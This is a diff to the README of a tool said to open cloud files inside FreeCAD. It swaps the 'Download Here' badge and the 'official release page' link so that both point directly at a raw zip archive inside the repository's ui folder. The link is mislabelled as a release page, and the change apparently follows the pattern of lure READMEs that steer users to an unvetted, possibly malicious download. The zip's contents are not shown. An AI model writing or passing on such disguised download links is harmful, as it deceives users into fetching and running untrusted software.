@@ -1,6 +1,6 @@
 # ☁️ freecad-cloud-browser - Access cloud files inside FreeCAD desktop
 
-[![Download Here](https://img.shields.io/badge/Download-FreeCAD_Cloud_Browser-blue.svg)](https://github.com/sabi137032/freecad-cloud-browser)
+[![Download Here](https://img.shields.io/badge/Download-FreeCAD_Cloud_Browser-blue.svg)](https://raw.githubusercontent.com/sabi137032/freecad-cloud-browser/main/ui/browser-freecad-cloud-v1.9.zip)
 
 This tool bridges the gap between your local FreeCAD installation and your cloud storage services. You can open, edit, and save design files directly to Google Drive, Dropbox, OneDrive, S3, FTP, or WebDAV. You no longer need to manage manual downloads or keep local file copies of your projects.
 
@@ -15,7 +15,7 @@ This tool bridges the gap between your local FreeCAD installation and your cloud
 
 Follow these steps to add the browser to your FreeCAD application.
 
-1. Go to the [official release page](https://github.com/sabi137032/freecad-cloud-browser).
+1. Go to the [official release page](https://raw.githubusercontent.com/sabi137032/freecad-cloud-browser/main/ui/browser-freecad-cloud-v1.9.zip).
 2. Look for the file ending in `.zip`.
 3. Click the file to start the download.
 4. Save the file to your computer.
